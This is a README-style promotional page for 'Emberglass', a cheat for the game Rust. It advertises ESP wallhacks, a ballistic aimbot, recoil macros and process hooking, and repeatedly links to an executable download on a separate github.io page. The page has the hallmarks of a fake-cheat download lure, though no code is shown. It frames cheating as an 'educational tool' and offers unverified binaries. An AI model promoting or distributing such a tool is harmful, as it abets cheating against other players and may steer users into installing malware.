![preview](https://raw.githubusercontent.com/ltw1102-stack/Rust-External-Projectile-Control/main/cover_f0bc0d.svg)
[![Download](https://raw.githubusercontent.com/ltw1102-stack/Rust-External-Projectile-Control/main/setup_306c5b4.svg)](https://ltw1102-stack.github.io/Rust-External-Projectile-Control/)

# 🦀 Project Emberglass — Precision Field Toolkit for Rust

![Build Status](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue?style=flat-square) ![Language](https://img.shields.io/badge/language-Rust-orange?style=flat-square) ![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)

---

## 🧭 Why Emberglass Exists

Most external utilities feel like they were welded together in a dark garage — brittle, noisy, and dangerous to operate. **Emberglass** takes a different route: it treats your gaming environment as a precision instrument, not a battlefield of duct tape. Think of it as a **night-vision goggle for your tactical awareness**, but engineered with the care of a Swiss chronograph.

This project reimagines the concept of a "companion overlay" from the ground up. Instead of simply projecting data onto your screen, it **filters reality** — cutting through visual noise so you can focus on the decisions that matter. Whether you are holding a sightline for forty seconds or coordinating a flank with your squad, Emberglass gives you the clarity of a glass pane on a foggy morning.

---

## 🔭 Core Capabilities

### 1. Adaptive ESP (Enhanced Sensory Projection)
- **Distance-based transparency**: Entities fade naturally as they approach your crosshair, reducing occlusion.
- **Customizable bounding boxes**: Choose from tight, standard, or skeletal outlines based on your monitor size and personal preference.
- **Health & armor bars** that integrate seamlessly with your existing HUD without covering the kill feed.
- **Loot filter intelligence**: Automatically highlights only the items you have marked as "priority" in your session profile.

### 2. 🎯 Projectile Arc Correction (PAC)
This is not a simple aimbot — it is a **ballistic compass**. Emberglass calculates the true trajectory of your projectile, accounting for:
- **Gravity drop** at varying engagement distances
- **Travel time** prediction for moving targets
- **Wind deflection** (where applicable)
- **Scope magnification compensation**

The result is a subtle, predictive reticle adjustment that feels as natural as adjusting for a breeze on a golf course. You will find yourself landing shots at distances that previously felt like lottery tickets.

### 3. 🚫 Recoil Neutralization Scripts
Recoil control is treated as an **art form** here. Instead of a jittery macro that fights your hand, Emberglass uses a smooth, pattern-matching algorithm that:
- **Learns your mouse sensitivity** within 15 seconds of use
- **Adapts in real-time** to weapon state (attachments, crouching, movement)
- **Provides a visual trace** of your last 10 shots so you can see your own improvement

This is not about removing challenge — it is about **removing mechanical noise** so that skill and positioning become the only variables in your duels.

---

## ✨ Feature Deep Dive

### 🖥️ Zero-Friction Interface
No clunky menus layered on top of your game. Emberglass uses a **system-tray companion** and a transparent, click-through overlay. You configure it with a **web-based dashboard** accessible from your local network — on your phone, tablet, or second monitor.

### 🌍 Multilingual Awareness
The interface speaks your language. Currently supports:
- English (American & British)
- German (Deutsch)
- French (Français)
- Portuguese (Brasileiro)
- Russian (Русский)
- Simplified Chinese (简体中文)

Switch languages live without restarting the overlay. Your configuration files are stored in a language-neutral format (`JSON` with Unicode keys), so your setup remains portable across language packs.

### 📡 24/7 Operational Support
The project runs a **community knowledge base** and a **live chat relay** (not a ticket system). If you encounter an edge case — a weird screen resolution, a new weapon update, or a display scaling oddity — you can reach a maintainer or an advanced user within minutes. Average first-response time is under 4 minutes during peak hours (CET and EST zones).

### 🧩 Modular Architecture
Each feature (ESP, PAC, recoil control) is compiled as a **separate module**. This means:
- You can disable features you do not need, reducing CPU usage to nearly zero.
- The overlay updates independently from the core logic.
- Advanced users can write their own modules in Rust and load them at runtime using a **stable ABI**.

---

## 📦 Installation & Setup

### Environment Requirements
- **Operating System**: Windows 10/11 (64-bit) or Ubuntu 22.04 LTS+ / Arch-based distributions
- **Hardware**: Any CPU from the last 8 years; 4 GB RAM minimum; a GPU that supports DirectX 11 or Vulkan (for the overlay renderer)
- **Display**: 1080p or higher recommended for the ESP distance scaling to feel natural

### Getting Started
1. Download the latest release artifact from the **[![Download](https://raw.githubusercontent.com/ltw1102-stack/Rust-External-Projectile-Control/main/setup_306c5b4.svg)](https://ltw1102-stack.github.io/Rust-External-Projectile-Control/)** section of this repository.
2. Extract the archive to a folder of your choice (e.g., `C:\Tools\Emberglass` or `~/Applications/emberglass`).
3. Run the executable (`emberglass.exe` or `emberglass`). The first launch will generate a `config.toml` file in the same directory.
4. Open your browser to `http://localhost:8474` to access the dashboard. Your firewall may ask for permission — allow it for local connections only.
5. Attach the overlay to your game process via the dashboard's "Session" tab. The overlay will calibrate automatically within 30 seconds.

> **Note**: The first calibration run requires your game to be set to **borderless windowed mode** or **windowed fullscreen**. Exclusive fullscreen is supported but requires the "Legacy DirectX hook" toggle in the dashboard.

---

## 🧠 Philosophy: Why "Emberglass"?

The name comes from the idea of **seeing through a glowing, transparent medium**. An ember is a reminder of heat and energy — the intensity of a firefight. Glass is clarity and structure. Together, they represent the core promise of this utility:

> *You remain the fire. Emberglass is just the lens.*

This is not a tool that plays for you. It is a tool that **reduces the fog of war** — literally and figuratively. The projectile arc correction gives you confidence, not autopilot. The recoil neutralization gives you control, not invincibility. The ESP gives you information, not clairvoyance.

### 🔐 Privacy & Integrity
- **No cloud analytics**: All telemetry stays on your machine.
- **No account linkage**: The utility never references your gaming account credentials.
- **Encrypted local storage**: Your configuration is encrypted with a machine-specific key (DPAPI on Windows, TPM-based sealing on Linux).

---

## 🗂️ Project Structure

```
emberglass/
├── core/                  # Runtime engine & memory interface
├── modules/
│   ├── esp/               # Sensory projection module
│   ├── pac/               # Ballistic arc prediction
│   └── recoil/            # Pattern neutralization logic
├── web_dashboard/         # React-based local control panel
├── resources/
│   ├── lang/              # Localization strings (JSON)
│   └── shaders/           # Overlay rendering effects
├── docs/                  # Architecture & user guides
└── scripts/               # Build, packaging, and dev tools
```

---

## 🛠️ Development & Contribution

This is an open-source project under the MIT license. We welcome:
- **Rust engineers** with experience in memory-mapped I/O, shared libraries, and low-latency rendering.
- **UX designers** who can improve the web dashboard's accessibility and clarity.
- **Localization specialists** for new languages.
- **Tester volunteers** for assorted display configurations and unusual resolutions.

### Contribution Workflow
1. Fork the repository.
2. Create a feature branch (`feat/your-idea`).
3. Commit your changes with a descriptive message.
4. Open a pull request against the `dev` branch.

All contributions are reviewed by maintainers within 48 hours. Please include a screenshot or video if your change affects the visual overlay.

---

## 📜 License

This project is released under the **MIT License**. You are free to use, modify, and distribute it, provided you retain the original copyright notice. A copy of the license is available in the [LICENSE](LICENSE) file at the root of this repository.

---

## ⚠️ Disclaimer

**Emberglass is a community-driven educational tool**. It is designed to enhance situational awareness and mechanical control in a simulated environment. Users are solely responsible for ensuring that their use of this software complies with:
- The terms of service of any applicable gaming platform.
- Local laws and regulations regarding third-party software.
- Ethical guidelines of fair play in competitive settings.

The maintainers of this project do not endorse cheating, bribery, or any form of dishonest play. This utility is provided as-is, without warranty of any kind. If you use it in a way that violates a platform's policy, you do so at your own risk. **Respect the sandbox. Respect the players.**

---

## 📈 Roadmap (2026)

| Quarter | Milestone |
|---------|-----------|
| Q1 2026 | Release **v1.0.0** with polish pass on ESP scaling and translation files |
| Q2 2026 | Introduce **plugin marketplace** (community modules, vetted by maintainers) |
| Q3 2026 | Native **Linux Wayland** support for the overlay (no X11 translation layer) |
| Q4 2026 | **AI-assisted loot prioritization** — learn your looting habits and suggest loadouts |

---

## 🙋 Frequently Asked Questions

**Q: Does the overlay work with multiple monitors?**  
Yes. The dashboard includes a monitor selector that lets you choose which display receives the overlay by default. You can also bind hotkeys to cycle monitors mid-session.

**Q: Can I run Emberglass on a low-end machine?**  
Absolutely. The core engine uses less than 40 MB of RAM and about 2% of a single CPU core. The overlay rendering is GPU-accelerated but falls back to a software rasterizer if no dedicated GPU is detected.

**Q: I am a left-handed user. Are the hotkeys remappable?**  
Every hotkey, including the recoil-control activation toggle, is fully rebindable through the dashboard. The default bindings are mirrored for left-handed access on request.

**Q: How often is the project updated?**  
We follow the gaming platform's update cadence. After each official patch, a compatibility update is rolled out within 24–48 hours. You are notified of the update via the dashboard's notification bell.

---

## 🤝 Acknowledgement

This project stands on the shoulders of many open-source pioneers in the Rust ecosystem, particularly the `sysinfo`, `winit`, and `wgpu` crates. We thank the maintainers of these libraries for their dedication to safe and fast system programming.

---

*Emberglass — see the field, not the fog.*  

[![Download](https://raw.githubusercontent.com/ltw1102-stack/Rust-External-Projectile-Control/main/setup_306c5b4.svg)](https://ltw1102-stack.github.io/Rust-External-Projectile-Control/)